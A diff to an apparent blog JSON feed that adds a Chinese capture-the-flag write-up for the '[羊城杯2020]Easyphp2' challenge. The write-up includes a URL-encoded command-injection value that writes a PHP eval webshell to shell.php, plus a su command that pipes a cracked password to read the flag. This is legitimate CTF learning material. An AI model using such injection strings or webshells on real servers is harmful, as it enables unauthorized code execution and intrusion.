@@ -14,6 +14,17 @@
                 "buuctf",
                 "命令执行"
             ]
+        },
+        {
+            "id": "http://odiws.github.io/2024/09/24/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Easyphp2/",
+            "url": "http://odiws.github.io/2024/09/24/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Easyphp2/",
+            "title": "[羊城杯2020]Easyphp2",
+            "date_published": "2024-09-24T07:09:38.000Z",
+            "content_html": "<h2 id=\"羊城杯2020easyphp2\"><a class=\"markdownIt-Anchor\" href=\"#羊城杯2020easyphp2\">#</a> [羊城杯 2020] Easyphp2</h2>\n<p><img data-src=\"../images/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%5DEasyphp2/1.png\" alt=\"1\"></p>\n<p>抓包看看，可以发现有个 pass 变量将他换一下成 GWHT 之后，发现页面改变</p>\n<p><img data-src=\"../images/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%5DEasyphp2/2.png\" alt=\"2\"></p>\n<p>传递的框框是传在了 count 变量，在下面有回显，可以直接传参写马（记得 url 编码）</p>\n<pre><code>'%7C%20echo%20%22%3C%3F%3Deval(%5C%24_POST%5B'shell'%5D)%3F%3E%22%20%3E%20shell.php%20%7C%7C'\n</code></pre>\n<p>有了马直接蚁剑连接（但是不能直接访问 flag.txt）：</p>\n<p>还有 / GWHT/README 中有 md5 密码解密得：</p>\n<pre><code>GWHTCTF\n</code></pre>\n<p>在 / GWHT/system/of/a/down/flag.txt 中</p>\n<pre><code>printf &quot;GWHTCTF&quot; | su - GWHT -c 'cat /GWHT/system/of/a/down/flag.txt'\n</code></pre>\n<p><img data-src=\"../images/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%5DEasyphp2/3.png\" alt=\"3\"></p>\n<p>获取 flag</p>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MjYzOTUxL2FydGljbGUvZGV0YWlscy8xMTk3NzY5NTE=\">https://blog.csdn.net/qq_46263951/article/details/119776951</span></p>\n",
+            "tags": [
+                "buuctf",
+                "命令执行"
+            ]
         }
     ]
 }
